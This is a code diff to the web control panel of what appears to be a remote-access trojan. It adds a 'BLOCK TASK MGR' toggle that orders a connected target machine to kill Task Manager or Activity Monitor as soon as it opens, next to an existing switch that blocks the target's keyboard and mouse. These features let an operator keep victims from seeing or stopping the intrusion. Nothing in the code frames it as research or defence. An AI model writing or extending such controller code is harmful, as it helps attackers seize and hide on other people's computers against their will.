@@ -314,6 +314,9 @@ select{background:#050810;border:1px solid var(--border);padding:4px 8px;color:v
           <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--danger);cursor:pointer;" title="Block all keyboard and mouse input on target">
             <input type="checkbox" id="disable-input-toggle" onchange="toggleDisableInput(this.checked)"> DISABLE KB+MOUSE
           </label>
+          <label style="display:flex;align-items:center;gap:5px;font-size:10px;color:var(--danger);cursor:pointer;" title="Kill Task Manager / Activity Monitor the moment it opens">
+            <input type="checkbox" id="block-taskmgr-toggle" onchange="toggleBlockTaskmgr(this.checked)"> BLOCK TASK MGR
+          </label>
           <span class="stream-status" id="stream-status">IDLE</span>
         </div>
       </div>
@@ -735,6 +738,7 @@ function openNode(id){
   document.getElementById('modal-overlay').classList.add('open');
   // Reset input-disable checkbox whenever a new node is opened
   document.getElementById('disable-input-toggle').checked = false;
+  document.getElementById('block-taskmgr-toggle').checked = false;
   switchTab('screen');
 }
 function closeModal(){
@@ -744,6 +748,9 @@ function closeModal(){
   // If input was disabled, re-enable it when we close the modal
   const cb = document.getElementById('disable-input-toggle');
   if(cb.checked){ cb.checked=false; if(selectedClient) sendCmdRaw('input_enable'); }
+  // If task manager block was on, turn it off
+  const cb2 = document.getElementById('block-taskmgr-toggle');
+  if(cb2.checked){ cb2.checked=false; if(selectedClient) sendCmdRaw('taskmgr_block_disable'); }
 }
 document.getElementById('modal-overlay').addEventListener('click',e=>{ if(e.target===document.getElementById('modal-overlay')) closeModal(); });
 document.querySelectorAll('.tab-btn').forEach(btn=>btn.addEventListener('click',()=>switchTab(btn.dataset.tab)));
@@ -792,11 +799,27 @@ async function toggleDisableInput(on){
   label.style.opacity='1';
   if(res.status==='ok'){
     addLog((on?'⛔ Input disabled':'✅ Input re-enabled')+' on '+selectedClient.hostname, on?'error':'connect');
-    // Keep checkbox state in sync with result
   } else {
     addLog('Input toggle failed: '+(res.msg||'unknown'),'error');
-    // Revert checkbox on failure
     document.getElementById('disable-input-toggle').checked=!on;
+  }
+}
+
+async function toggleBlockTaskmgr(on){
+  if(!selectedClient){
+    document.getElementById('block-taskmgr-toggle').checked=false;
+    return;
+  }
+  const action = on ? 'taskmgr_block_enable' : 'taskmgr_block_disable';
+  const label = document.getElementById('block-taskmgr-toggle').closest('label');
+  label.style.opacity='0.5';
+  const res = await sendCmdRaw(action);
+  label.style.opacity='1';
+  if(res.status==='ok'){
+    addLog((on?'🚫 Task Manager block ON':'✅ Task Manager block OFF')+' — '+selectedClient.hostname, on?'error':'connect');
+  } else {
+    addLog('Task Manager block failed: '+(res.msg||'unknown'),'error');
+    document.getElementById('block-taskmgr-toggle').checked=!on;
   }
 }
 function getImgXY(e){ const r=e.target.getBoundingClientRect(); return{x:Math.round(e.clientX-r.left),y:Math.round(e.clientY-r.top)}; }
